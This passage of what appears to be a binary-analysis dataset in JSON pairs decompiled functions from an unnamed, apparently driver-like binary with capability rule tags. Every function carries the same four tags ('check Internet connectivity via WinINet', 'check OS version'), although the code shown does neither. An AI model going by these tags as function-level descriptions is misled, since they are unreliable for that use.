        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.000391b0(void)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    while( true ) {\n        fcn.00037640(0x800ce7a4, &var_4h, 0);\n        iVar1 = *0x800ce7a0;\n        if (*0x800ce7a0 != 0) {\n            var_10h = *(*0x800ce7a0 + 0xc);\n        }\n        fcn.00037670(0x800ce7a4, &var_4h, 0);\n        if (iVar1 == 0) break;\n        fcn.00039640(var_10h);\n    }\n    if (*0x800ce79c != 0) {\n        (**0x80051058)(*0x800ce79c);\n    }\n    fcn.00063b20(0x800ce7b0);\n    fcn.00063b20(0x800ce7b4);\n    for (var_8h = 0; var_8h < 0x10; var_8h = var_8h + 1) {\n        fcn.00037640(0x800db800, &var_4h, 0);\n        while (*(var_8h * 4 + -0x7ff247f4) != 0) {\n            fcn.00037670(0x800db800, &var_4h, 0);\n            fcn.00043cb0(0x32);\n            fcn.00037640(0x800db800, &var_4h, 0);\n        }\n        fcn.00037670(0x800db800, &var_4h, 0);\n    }\n    fcn.000376a0(0x800db800);\n    fcn.00071080(0x800ce878, 0);\n    return;\n}\n",
        "token_count": 473
    },
    "000392d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000392d0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    fcn.00037640(0x800ce7a4, &var_8h, 1);\n    iVar1 = fcn.000533b0(0x800ce878, 0, 0);\n    if (iVar1 != 0) {\n        var_4h = fcn.000399d0(arg_ch, 1);\n        if (var_4h != 0) {\n            var_ch = *(var_4h + 0xc);\n        }\n    }\n    fcn.00037670(0x800ce7a4, &var_8h, 1);\n    if (var_ch != 0) {\n        fcn.00039640(var_ch);\n    }\n    pcVar2 = fcn.00063f30(arg_8h);\n    (*pcVar2)(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 268
    },
    "00039360": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00039360(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (*(arg_10h + 0x10) == *0x800ce79c) {\n        var_4h = fcn.00038eb0(arg_10h, &var_8h);\n        if (var_4h == 0) {\n            (**0x80051050)(var_8h, arg_10h);\n            pcVar1 = fcn.00063f30(arg_8h);\n            (*pcVar1)(arg_8h, arg_ch, var_8h, arg_14h);\n        }\n        else {\n            (**0x80051060)(arg_10h);\n        }\n    }\n    else {\n        pcVar1 = fcn.00063f30(arg_8h);\n        (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 249
    },
    "000393e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000393e0(uint arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.0003d980(arg_ch, &var_4h);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00048eb0();\n        if (iVar1 == 0) {\n            pcVar2 = fcn.00063f30(arg_8h);\n            (*pcVar2)(arg_8h, arg_ch, arg_10h, arg_14h);\n        }\n        else {\n            for (var_8h = 0; var_8h < arg_14h; var_8h = var_8h + 1) {\n                iVar1 = *(arg_10h + var_8h * 4);\n                (**0x8005105c)(&var_ch, &var_14h, *0x800ce79c);\n                if (var_ch != 0) break;\n                var_ch = fcn.00038e00(iVar1, var_14h);\n                if (var_ch != 0) {\n                    (**0x80051060)(var_14h);\n                    break;\n                }\n                *(var_14h + 0x18) = *(iVar1 + 0x18);\n                *(var_14h + 8) = *(iVar1 + 8);\n                *(var_14h + 0xc) = *(iVar1 + 0xc);\n                puVar4 = *(iVar1 + 0x1e) + iVar1;\n                puVar5 = *(var_14h + 0x1e) + var_14h;\n                for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar5 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    puVar5 = puVar5 + 1;\n                }\n                (**0x80051054)(var_14h, iVar1);\n                if (((*(iVar1 + 0x1d) & 0x80) == 0) || ((*(iVar1 + 0x1d) & 0x40) == 0)) {\n                    var_18h = 0;\n                    var_10h = 0;\n                }\n                else {\n                    var_18h = *(iVar1 + 0x18 + *(iVar1 + 0x1e));\n                    var_10h = *(iVar1 + 0x14 + *(iVar1 + 0x1e));\n                }\n                if (((var_18h != 0) || (var_10h != 0)) && ((*(var_14h + 0x1d) & 0x80) != 0)) {\n                    *(var_14h + 0x1d) = *(var_14h + 0x1d) | 0x40;\n                    *(var_14h + 0x18 + *(var_14h + 0x1e)) = var_18h;\n                    *(var_14h + 0x14 + *(var_14h + 0x1e)) = var_10h;\n                }\n                (**(var_4h + 0x54))(var_4h, &var_14h, 1);\n            }\n            if (var_8h != arg_14h) {\n                iVar1 = arg_14h - var_8h;\n                arg_10h = arg_10h + var_8h * 4;\n                pcVar2 = fcn.00063f30(arg_8h);\n                (*pcVar2)(arg_8h, arg_ch, arg_10h, iVar1);\n            }\n        }\n    }\n    else {\n        pcVar2 = fcn.00063f30(arg_8h);\n        (*pcVar2)(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 991
    },
    "000395e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000395e0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *puVar5;\n    uint var_4h;\n    \n    uVar4 = arg_ch;\n    puVar5 = arg_18h;\n    pcVar1 = fcn.00063f30(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, uVar4, arg_10h, arg_14h, puVar5);\n    if ((iVar2 == 0) && (iVar3 = fcn.00039890(arg_ch, 0, *arg_18h),  iVar3 == 0)) {\n        fcn.00039770(*arg_18h);\n    }\n    return iVar2;\n}\n",
        "token_count": 213
    },
    "00039640": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00039640(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = NULL;\n    var_ch = 0;\n    var_14h = 0;\n    if (arg_8h == 0) {\n        uVar1 = 0xc00000ef;\n    }\n    else {\n        fcn.00037640(0x800ce7a4, &var_8h, 0);\n        var_4h = fcn.00039960(arg_8h, 1);\n        if (var_4h != NULL) {\n            var_ch = var_4h + 0x18;\n            var_14h = var_4h + 0x14;\n        }\n        fcn.00037670(0x800ce7a4, &var_8h, 0);\n        if (var_4h == NULL) {\n            uVar1 = 0xc000000d;\n        }\n        else {\n            iVar2 = fcn.00063b20(var_14h);\n            if (iVar2 == 0) {\n                fcn.00063b20(var_ch);\n            }\n            fcn.00037640(0x800ce7a4, &var_8h, 0);\n            var_10h = NULL;\n            for (var_4h = *0x800ce7a0; (var_4h != NULL && (var_4h[3] != arg_8h)); var_4h = *var_4h) {\n                var_10h = var_4h;\n            }\n            if (var_4h != NULL) {\n                if (var_10h == NULL) {\n                    *0x800ce7a0 = *var_4h;\n                }\n                else {\n                    *var_10h = *var_4h;\n                }\n            }\n            fcn.00037670(0x800ce7a4, &var_8h, 0);\n            fcn.000357f0(var_4h);\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 519
    },
    "00039770": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00039770(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_1ch = NULL;\n    var_10h = NULL;\n    fcn.00037640(0x800ce7a4, &var_8h, 0);\n    iVar1 = fcn.000533b0(0x800ce878, 0, 0);\n    if ((iVar1 != 0) && (var_4h = fcn.00039960(arg_8h, 1),  var_4h != 0)) {\n        var_1ch = var_4h + 0x18;\n        var_10h = var_4h + 0x14;\n    }\n    fcn.00037670(0x800ce7a4, &var_8h, 0);\n    if (var_4h == 0) {\n        iVar1 = -0x3ffffff3;\n    }\n    else if ((*var_1ch == 0) && (*var_10h == 0)) {\n        if (*(arg_8h + 0x24) == 0) {\n            iVar1 = -0x3fffffff;\n        }\n        else {\n            iVar1 = *(*(arg_8h + 0x24) + *0x800ce7fc);\n            if ((iVar1 == 0) || (iVar1 = fcn.000636c0(iVar1, 0x80079360, var_1ch),  iVar1 == 0)) {\n                iVar1 = fcn.000636c0(*(arg_8h + *0x800db6e8), 0x800793e0, var_10h);\n                if (iVar1 != 0) {\n                    fcn.00063b20(var_1ch);\n                }\n                iVar1 = 0;\n            }\n        }\n    }\n    else {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 510
    },
    "00039890": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00039890(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    iVar1 = fcn.00039960(arg_10h, 0);\n    if (iVar1 == 0) {\n        puVar2 = fcn.000356f0(0x1c);\n        if (puVar2 == NULL) {\n            var_ch = 0xc000009a;\n        }\n        else {\n            *puVar2 = 0;\n            puVar2[1] = 0;\n            puVar2[2] = 0;\n            puVar2[3] = 0;\n            puVar2[4] = 0;\n            puVar2[5] = 0;\n            puVar2[6] = 0;\n            puVar2[1] = arg_8h;\n            puVar2[2] = arg_ch;\n            puVar2[3] = arg_10h;\n            fcn.00037640(0x800ce7a4, &var_4h, 1);\n            iVar1 = fcn.000533b0(0x800ce878, 0, 0);\n            if (iVar1 == 0) {\n                var_ch = 0x21590006;\n            }\n            else {\n                *puVar2 = *0x800ce7a0;\n                *0x800ce7a0 = puVar2;\n            }\n            fcn.00037670(0x800ce7a4, &var_4h, 1);\n        }\n    }\n    else {\n        var_ch = 0;\n    }\n    return var_ch;\n}\n",
        "token_count": 405
    },
    "00039960": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00039960(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037640(0x800ce7a4, &var_4h, 0);\n    }\n    for (var_8h = *0x800ce7a0; (var_8h != NULL && (var_8h[3] != arg_8h)); var_8h = *var_8h) {\n    }\n    if (arg_ch == 0) {\n        fcn.00037670(0x800ce7a4, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 177
    },
    "000399d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.000399d0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037640(0x800ce7a4, &var_4h, 0);\n    }\n    for (var_8h = *0x800ce7a0; (var_8h != NULL && (var_8h[1] != arg_8h)); var_8h = *var_8h) {\n    }\n    if (arg_ch == 0) {\n        fcn.00037670(0x800ce7a4, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 178
    },
    "00039a40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00039a40(void)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = NULL;\n    var_ch = 0;\n    fcn.00037640(0x800ce7a4, &var_8h, 0);\n    var_4h = *0x800ce7a0;\n    do {\n        if (var_4h == NULL) {\ncode_r0x00039aa3:\n            fcn.00037670(0x800ce7a4, &var_8h, 0);\n            return var_ch;\n        }\n        uVar1 = fcn.0003d900(var_4h[2]);\n        var_4h[4] = uVar1;\n        if (var_4h[4] == 0) {\n            var_ch = 0xc0000001;\n            goto code_r0x00039aa3;\n        }\n        var_4h = *var_4h;\n    } while( true );\n}\n",
        "token_count": 239
    },
    "00039ac0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00039ac0(uint arg_8h)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uchar var_ch;\n    uchar var_bh;\n    ushort var_ah;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x800ce7dc == 0) {\n        var_10h._0_1_ = 0x80;\n        var_10h._1_1_ = 1;\n        var_10h._2_2_ = 0x10;\n        var_ch = 0;\n        var_ah = 8;\n        var_8h = 0x666c3650;\n        var_bh = 1;\n        var_4h = 0x5e8;\n        *0x800ce7dc = (**0x800ce710)(arg_8h, &var_10h);\n    }\n    return 0;\n}\n",
        "token_count": 217
    },
    "00039b20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00039b20(void)\n\n{\n    if (*0x800ce7dc != 0) {\n        (**0x800ce714)(*0x800ce7dc);\n    }\n    *0x800ce7dc = 0;\n    return;\n}\n",
        "token_count": 59
    },
    "00039b50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00039b75)\n\nuint __cdecl fcn.00039b50(int32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = NULL;\n    uVar2 = *(arg_8h + 2) + *(arg_8h + 3) & 0x8000000f;\n    var_4h = fcn.000356f0(0x10);\n    if (var_4h == NULL) {\n        uVar1 = 0xc000009a;\n    }\n    else {\n        *var_4h = 0;\n        var_4h[2] = arg_8h;\n        var_4h[1] = arg_ch;\n        var_4h[3] = *(arg_8h + 0x10);\n        fcn.00037640(0x800db7a0, &var_8h, 1);\n        *var_4h = *(uVar2 * 4 + -0x7ff24854);\n        *(uVar2 * 4 + -0x7ff24854) = var_4h;\n        fcn.00037670(0x800db7a0, &var_8h, 1);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 331
    },
    "00039c00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00039c1e)\n\nuint __cdecl fcn.00039c00(int32_t arg_8h, int32_t arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    uVar2 = *(arg_8h + 2) + *(arg_8h + 3) & 0x8000000f;\n    fcn.00037640(0x800db7a0, &var_ch, 1);\n    var_8h = NULL;\n    var_4h = *(uVar2 * 4 + -0x7ff24854);\n    do {\n        if (var_4h == NULL) {\ncode_r0x00039ca6:\n            fcn.00037670(0x800db7a0, &var_ch, 1);\n            if (var_4h == NULL) {\n                uVar1 = 0xc0000001;\n            }\n            else {\n                fcn.000357f0(var_4h);\n                uVar1 = 0;\n            }\n            return uVar1;\n        }\n        if ((var_4h[2] == arg_8h) && (var_4h[1] == arg_ch)) {\n            if (var_8h == NULL) {\n                *(uVar2 * 4 + -0x7ff24854) = *var_4h;\n            }\n            else {\n                *var_8h = *var_4h;\n            }\n            *arg_10h = var_4h[3];\n            goto code_r0x00039ca6;\n        }\n        var_8h = var_4h;\n        var_4h = *var_4h;\n    } while( true );\n}\n",
        "token_count": 426
    },
    "00039ce0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00039ce0(uint arg_8h)\n\n{\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 0;\n    var_10h = 0;\n    var_24h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_1ch = 0;\n    var_20h = fcn.00039ac0(arg_8h);\n    if ((var_20h == 0) && (var_20h = fcn.000421d0(arg_8h, &var_1ch, &var_14h),  var_20h == 0)) {\n        fcn.00037440(0x800ce7b8);\n        fcn.00078bfa(0x800db7a0, 0, 0x4c);\n        fcn.00037440(0x800db7a0);\n        var_20h = fcn.00034f40(0x80054990, &var_8h);\n        if ((((var_20h == 0) &&\n             ((((var_20h = fcn.0005cd70(var_8h, 0x80054c28, &var_18h),  var_20h == 0 &&\n                (var_20h = fcn.0005cd70(var_8h, 0x80054c44, &var_10h),  var_20h == 0)) &&\n               (var_20h = fcn.0005cd70(var_8h, 0x80054f54, &var_24h),  var_20h == 0)) &&\n              ((var_20h = fcn.0005cd70(var_8h, 0x80054f6c, &var_4h),  var_20h == 0 &&\n               (var_20h = fcn.000636c0(var_18h, 0x8007a1f0, 0x800ce7cc),  var_20h == 0)))))) &&\n            (var_20h = fcn.000636c0(var_10h, 0x8007a230, 0x800ce7d0),  var_20h == 0)) &&\n           ((var_20h = fcn.000636c0(var_24h, 0x8007a750, 0x800ce7d4),  var_20h == 0 &&\n            (var_20h = fcn.000636c0(var_4h, 0x8007a180, 0x800ce7d8),  var_20h == 0)))) {\n            var_20h = 0;\n            var_ch = 0;\n            while ((var_ch < var_14h && (var_20h = fcn.0003a010(*(var_1ch + var_ch * 4)),  var_20h == 0))) {\n                var_ch = var_ch + 1;\n            }\n        }\n    }\n    fcn.000357f0(var_1ch);\n    if (var_20h != 0) {\n        fcn.00039ee0();\n    }\n    return var_20h;\n}\n",
        "token_count": 788
    },
    "00039ee0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00039ee0(void)\n\n{\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    while( true ) {\n        fcn.00037640(0x800ce7b8, &var_4h, 0);\n        if (*0x800ce7c4 == 0) {\n            var_10h = 0;\n        }\n        else {\n            var_10h = *(*0x800ce7c4 + 4);\n        }\n        fcn.00037670(0x800ce7b8, &var_4h, 0);\n        if (var_10h == 0) break;\n        fcn.00039ff0(var_10h);\n    }\n    fcn.00063b20(0x800ce7d0);\n    fcn.00063b20(0x800ce7cc);\n    fcn.00063b20(0x800ce7d4);\n    fcn.00063b20(0x800ce7d8);\n    for (var_8h = 0; var_8h < 0x10; var_8h = var_8h + 1) {\n        fcn.00037640(0x800db7a0, &var_4h, 0);\n        while (*(var_8h * 4 + -0x7ff24854) != 0) {\n            fcn.00037670(0x800db7a0, &var_4h, 0);\n            fcn.00043cb0(0x32);\n            fcn.00037640(0x800db7a0, &var_4h, 0);\n        }\n        fcn.00037670(0x800db7a0, &var_4h, 0);\n    }\n    fcn.000376a0(0x800db7a0);\n    fcn.00039b20();\n    return;\n}\n",
        "token_count": 465
    },
    "0003a010": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003a010(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_10h = fcn.0003af90(arg_8h);\n    if (var_10h == 0) {\n        for (var_4h = 0; var_4h < 2; var_4h = var_4h + 1) {\n            iVar1 = fcn.00078b76();\n            if (iVar1 == 0) {\n                return 0;\n            }\n        }\n        var_10h = fcn.0003a4b0(arg_8h, 4);\n        if ((((var_10h == 0) && (var_10h = fcn.0003a4b0(arg_8h, 3),  var_10h == 0)) &&\n            (var_10h = fcn.0003a4b0(arg_8h, 0),  var_10h == 0)) && (var_10h = fcn.0003a4b0(arg_8h, 2),  var_10h == 0)) {\n            var_ch = *(arg_8h + 0xc);\n            while (((var_ch != 0 && (var_10h = fcn.0003ade0(var_ch, *(var_ch + 0xc), arg_8h),  var_10h == 0)) &&\n                   ((var_10h = fcn.0003a3b0(var_ch, *(var_ch + 0x10c), 0),  var_10h == 0 &&\n                    (var_10h = fcn.0003a3b0(var_ch, *(var_ch + 0x110), 2),  var_10h == 0))))) {\n                var_ch = *(var_ch + 4);\n            }\n        }\n        if (var_10h != 0) {\n            fcn.00039ff0(arg_8h);\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 495
    },
    "0003a180": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0003a180(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    fcn.00037640(0x800ce7b8, &var_8h, 1);\n    var_4h = fcn.0003ad70(arg_ch, 1);\n    if (var_4h != 0) {\n        *(var_4h + 0x18) = arg_10h;\n    }\n    fcn.00037670(0x800ce7b8, &var_8h, 1);\n    pcVar1 = fcn.00063f30(arg_8h);\n    (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 213
    },
    "0003a1f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003a1f0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_4h;\n    \n    puVar3 = arg_18h;\n    pcVar1 = fcn.00063f30(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, puVar3);\n    if (iVar2 == 0) {\n        fcn.0003a010(*arg_18h);\n    }\n    return iVar2;\n}\n",
        "token_count": 164
    },
    "0003a250": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003a250(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_14h = 0;\n    var_10h = 0;\n    var_8h = 0;\n    fcn.00037640(0x800ce7b8, &var_4h, 1);\n    iVar1 = fcn.0003aeb0(arg_8h, 1);\n    if (iVar1 != 0) {\n        var_ch = *(iVar1 + 0xc);\n        var_14h = *(iVar1 + 0x10);\n        var_10h = *(iVar1 + 0x18);\n        var_8h = *(iVar1 + 0x14);\n        *(iVar1 + 0x18) = 0;\n        *(iVar1 + 0x14) = 0;\n        *(iVar1 + 0xc) = 0;\n        *(iVar1 + 0x10) = 0;\n    }\n    fcn.00037670(0x800ce7b8, &var_4h, 1);\n    fcn.00063b20(&var_ch);\n    fcn.00063b20(&var_14h);\n    fcn.00063b20(&var_10h);\n    fcn.00063b20(&var_8h);\n    return 0;\n}\n",
        "token_count": 354
    },
    "0003a320": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003a320(uint arg_8h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    fcn.00037640(0x800ce7b8, &var_4h, 1);\n    var_8h = fcn.0003ad70(arg_8h, 1);\n    if (var_8h != 0) {\n        var_ch = *(var_8h + 8);\n        var_10h = *(var_8h + 0xc);\n        *(var_8h + 8) = 0;\n        *(var_8h + 0xc) = 0;\n    }\n    fcn.00037670(0x800ce7b8, &var_4h, 1);\n    fcn.00063b20(&var_ch);\n    fcn.00063b20(&var_10h);\n    return 0;\n}\n",
        "token_count": 238
    },
    "0003a3b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
